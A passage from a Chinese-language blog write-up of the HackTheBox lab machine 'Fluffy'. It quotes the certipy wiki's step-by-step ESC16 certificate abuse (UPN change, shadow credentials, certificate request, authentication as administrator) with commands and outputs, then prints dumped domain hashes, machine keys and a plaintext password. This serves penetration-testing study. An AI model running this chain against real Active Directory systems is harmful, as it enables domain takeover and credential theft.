FLUFFY.HTB\Domain Admins                                                                                                                          </span><br><span class="line">                                          FLUFFY.HTB\Enterprise Admins                                                                                                                      </span><br><span class="line">                                          FLUFFY.HTB\Administrators                                                                                                                         </span><br><span class="line">        ManageCertificates              : FLUFFY.HTB\Domain Admins                                                                                                                          </span><br><span class="line">                                          FLUFFY.HTB\Enterprise Admins                                                                                                                      </span><br><span class="line">                                          FLUFFY.HTB\Administrators                                                                                                                         </span><br><span class="line">        Enroll                          : FLUFFY.HTB\Cert Publishers                                                                                                                        </span><br><span class="line">    [!] Vulnerabilities                                                                       </span><br><span class="line">      ESC16                             : Security Extension is disabled.                                                                                                                   </span><br><span class="line">    [*] Remarks                                                                               </span><br><span class="line">      ESC16                             : Other prerequisites may be required <span class="keyword">for</span> this to be exploitable. See the wiki <span class="keyword">for</span> more details.  </span><br></pre></td></tr></table></figure></div>

<p>可以发现能够利用ESC16</p>
<p>去翻看certipy的wiki可以看到完整的利用方式和原理</p>
<blockquote>
<p><strong>Scenario A: UPN Manipulation (Requires <code>StrongCertificateBindingEnforcement = 1</code> (Compatibility) or <code>0</code> (Disabled) on DCs, and attacker has write access to a “victim” account’s UPN)<br>场景 A：UPN 操纵（需要在 DC 上启用 <code>StrongCertificateBindingEnforcement = 1</code> （兼容性）或 <code>0</code> （禁用），且攻击者对”受害者”账户的 UPN 有写入权限）</strong></p>
<p>Attacker (<code>attacker@corp.local</code>) has <code>GenericWrite</code> permission over a “victim” account (<code>victim@corp.local</code>). The <code>victim</code> account can enroll in <em>any suitable client authentication template</em> (e.g., the default “User” template) on the ESC16-vulnerable CA. The target for impersonation is <code>administrator@corp.local</code>.<br>攻击者( <code>attacker@corp.local</code> )对”受害者”账户( <code>victim@corp.local</code> )拥有 <code>GenericWrite</code> 权限。 <code>victim</code> 账户可以注册 ESC16 易受攻击 CA 上任何合适的客户端认证模板（例如默认的”用户”模板）。目标是 <code>administrator@corp.local</code> 。</p>
<ul>
<li><p><strong>Step 1: Read initial UPN of the victim account (Optional - for restoration).<br>步骤 1：读取受害者账户的初始 UPN（可选——用于恢复）。</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy account \</span><br><span class="line">    -u &#x27;attacker@corp.local&#x27; -p &#x27;Passw0rd!&#x27; \</span><br><span class="line">    -dc-ip &#x27;10.0.0.100&#x27; -user &#x27;victim&#x27; \</span><br><span class="line">    read</span><br></pre></td></tr></table></figure></div>



<p><strong>Expected Output Snippet: 预期输出片段：</strong></p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Certipy v5.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Reading attributes for &#x27;victim&#x27;:</span><br><span class="line">    cn                                  : Victim</span><br><span class="line">    userPrincipalName                   : victim@CORP.LOCAL</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>


</li>
<li><p><strong>Step 2: Update the victim account’s UPN to the target administrator’s <code>sAMAccountName</code>.<br>步骤 2：将受害者账户的 UPN 更改为目标管理员的 <code>sAMAccountName</code> 。</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy account \</span><br><span class="line">    -u &#x27;attacker@corp.local&#x27; -p &#x27;Passw0rd!&#x27; \</span><br><span class="line">    -dc-ip &#x27;10.0.0.100&#x27; -upn &#x27;administrator&#x27; \</span><br><span class="line">    -user &#x27;victim&#x27; update</span><br></pre></td></tr></table></figure></div>



<p><strong>Expected Output Snippet: 预期输出片段：</strong></p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Certipy v5.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;victim&#x27;:</span><br><span class="line">    userPrincipalName                   : administrator</span><br><span class="line">[*] Successfully updated &#x27;victim&#x27;</span><br></pre></td></tr></table></figure></div>


</li>
<li><p><strong>Step 3: (If needed) Obtain credentials for the “victim” account (e.g., via Shadow Credentials).<br>步骤 3：（如有必要）获取“受害者”账户的凭证（例如，通过影子凭证）。</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow \</span><br><span class="line">    -u &#x27;attacker@corp.local&#x27; -p &#x27;Passw0rd!&#x27; \</span><br><span class="line">    -dc-ip &#x27;10.0.0.100&#x27; -account &#x27;victim&#x27; \</span><br><span class="line">    auto</span><br></pre></td></tr></table></figure></div>



<p><strong>Expected Output Snippet: 预期输出片段：</strong></p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Certipy v5.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line">...</span><br><span class="line">[*] Saving credential cache to &#x27;victim.ccache&#x27;</span><br><span class="line">[*] Wrote credential cache to &#x27;victim.ccache&#x27;</span><br><span class="line">[*] NT hash for &#x27;victim&#x27;: fc525c9683e8fe067095ba2ddc971889</span><br></pre></td></tr></table></figure></div>


</li>
<li><p><strong>Step 4: Request a certificate as the “victim” user from *any suitable client authentication template* (e.g., “User”) on the ESC16-vulnerable CA.</strong> Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template’s specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):<br>第 4 步：从 ESC16-vulnerable CA 的任何合适的客户端认证模板（例如”User”）中，以”victim”用户身份请求证书。由于该 CA 存在 ESC16 漏洞，它将自动从签发的证书中省略 SID 安全扩展，而不管该扩展在模板中的具体设置如何。设置 Kerberos 凭证缓存环境变量（shell 命令）：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=victim.ccache</span><br></pre></td></tr></table></figure></div>



<p>Then request the certificate:<br>然后请求证书：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -k -dc-ip &#x27;10.0.0.100&#x27; \</span><br><span class="line">    -target &#x27;CA.CORP.LOCAL&#x27; -ca &#x27;CORP-CA&#x27; \</span><br><span class="line">    -template &#x27;User&#x27;</span><br></pre></td></tr></table></figure></div>



<p><strong>Expected Output Snippet: 预期输出片段：</strong></p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Certipy v5.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 1</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@corp.local&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Try using -sid to set the object SID or see the wiki for more details</span><br><span class="line">[*] Saving certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line">[*] Wrote certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure></div>


</li>
<li><p><strong>Step 5: Revert the “victim” account’s UPN.<br>步骤 5：恢复“受害者”账户的 UPN。</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy account \</span><br><span class="line">    -u &#x27;attacker@corp.local&#x27; -p &#x27;Passw0rd!&#x27; \</span><br><span class="line">    -dc-ip &#x27;10.0.0.100&#x27; -upn &#x27;victim@corp.local&#x27; \</span><br><span class="line">    -user &#x27;victim&#x27; update</span><br></pre></td></tr></table></figure></div>



<p><strong>Expected Output Snippet: 预期输出片段：</strong></p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Certipy v5.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;victim&#x27;:</span><br><span class="line">    userPrincipalName                   : victim@corp.local</span><br><span class="line">[*] Successfully updated &#x27;victim&#x27;</span><br></pre></td></tr></table></figure></div>


</li>
<li><p><strong>Step 6: Authenticate as the target administrator.<br>第六步：以目标管理员身份进行认证。</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certipy auth \</span><br><span class="line">    -dc-ip &#x27;10.0.0.100&#x27; -pfx &#x27;administrator.pfx&#x27; \</span><br><span class="line">    -username &#x27;administrator&#x27; -domain &#x27;corp.local&#x27;</span><br></pre></td></tr></table></figure></div>



<p><strong>Expected Output Snippet: 预期输出片段：</strong></p>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Certipy v5.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: &#x27;administrator&#x27;</span><br><span class="line">[*] Using principal: &#x27;administrator@corp.local&#x27;</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Wrote credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@corp.local&#x27;: aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889</span><br></pre></td></tr></table></figure></div>



<p>Note the <code>Certificate identities</code> list only shows <code>SAN UPN: &#39;administrator&#39;</code>, confirming the absence of any SID extensions in this certificate.<br>注意 <code>Certificate identities</code> 列表仅显示 <code>SAN UPN: &#39;administrator&#39;</code> ，确认此证书中不存在任何 SID 扩展。</p>
</li>
</ul>
</blockquote>
<p>完整利用后可得到administrator的hash，winrm登录后即可得到root.hash</p>
<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                                                                            </span><br><span class="line">Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">8</span>da83a3fa618b6e3a00e93f676c92a6e:::                      Guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::                             DefaultAccount:<span class="number">503</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::                     FLUFFY\DC01<span class="variable">$</span>:aes256<span class="literal">-cts-hmac-sha1-96</span>:<span class="number">34</span>b5e3f67441a6c19509cb966b9e5392e48257ff5058e7a22a4282fe822a5751       FLUFFY\DC01<span class="variable">$</span>:aes128<span class="literal">-cts-hmac-sha1-96</span>:<span class="number">19</span>a1dd430a92c3568f04814342d8e486                                       FLUFFY\DC01<span class="variable">$</span>:des<span class="literal">-cbc-md5</span>:ec13a85edf688a85                          </span><br><span class="line">FLUFFY\DC01<span class="variable">$</span>:plain_password_hex:c051a2b56dd8422b09fcc441e1bfaf0a5f0fe659a1634184e7dd6849da03747cad2050bd71e55da3e979245cb872106b52367ac876380294db669d308655c9f8f72b71ea10b4cc90199e1a059645dad4e77b3b982de60b7a59af8d4261b0077be1890caf3aa7e6290dcbc0c443f81bc6124cdef4e2647</span><br><span class="line"><span class="number">2</span>b3a5c8bcd8fc666b876709496e61a026559328d19db45819e69695bbafda526692513d2457e98de68b9473b08ed96e1d50b06dc53c6e58a595feebd6568a2a75811a5456336f40ede98c2996a0360a618d492e112a905235641126ad3234d68a920c0cd9439b4bd7203d28a1ad4d2ebdbe484d47836735b4cb</span><br><span class="line">FLUFFY\DC01<span class="variable">$</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">7</span>a9950c26fe9c3cbfe5b9ceaa21c9bfd:::                           [*] DefaultPassword                                                </span><br><span class="line">p.agila:prometheusx<span class="literal">-303</span>                                            </span><br><span class="line">[*] DPAPI_SYSTEM                                                   </span><br><span class="line">dpapi_machinekey:<span class="number">0</span>x50f64bc1be95364da6cc33deca194d9b827c4846                                                 dpapi_userkey:<span class="number">0</span>xe410025a604608d81064e274f6eb46cba458ebd5 </span><br></pre></td></tr></table></figure></div>

<h2 id="Sum"><a href="#Sum" class="headerlink" title="Sum"></a>Sum</h2><p>提权时候遇到了certipy这个工具的利用，以及ESC16的原理。模板利用的原理我还不是很清除。之前对于generic等权限的理解也不全。花佬给我发了一张图片，感觉讲的很详细，里面标注了拥有何种权限时候的利用方式。以后在遇到不会的地方时候可以回来看一看。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/eeac22e31aa9a743e0e9bfc5855f077.png"
                      alt="eeac22e31aa9a743e0e9bfc5855f077"
                ></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Fluffy</li>
        <li><strong>Author:</strong> EnchanterW</li>
        <li><strong>Created at
                :</strong> 2025-05-28 15:28:31</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-12-04 17:06:54
            </li>
        
        <li>
            <strong>Link:</strong> https://enchanter-w.github.io/2025/05/28/Fluffy/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Windows%E6%8F%90%E6%9D%83/">#Windows提权</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/nxc/">#nxc</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/certipy/">#certipy</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/">#权限总结</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/05/31/tunnel_guide/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">关于端口转发我知道的那些事</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/05/20/Puppy/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Puppy</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'Enchanter-W/giscus_comment',
                'data-repo-id': 'R_kgDOPzpiow',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOPzpio84CvroL',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'top',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Fluffy</div>
		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enum"><span class="nav-text">Enum</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ldap"><span class="nav-text">ldap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#To-User"><span class="nav-text">To User</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NXC"><span class="nav-text">NXC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB"><span class="nav-text">SMB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bloodhound"><span class="nav-text">bloodhound</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#winrm-login"><span class="nav-text">winrm login</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#To-Root"><span class="nav-text">To Root</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sum"><span class="nav-text">Sum</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">EnchanterW</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        19 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io" rel="external nofollow noreferrer">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine" rel="external nofollow noreferrer">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>





    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>











    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>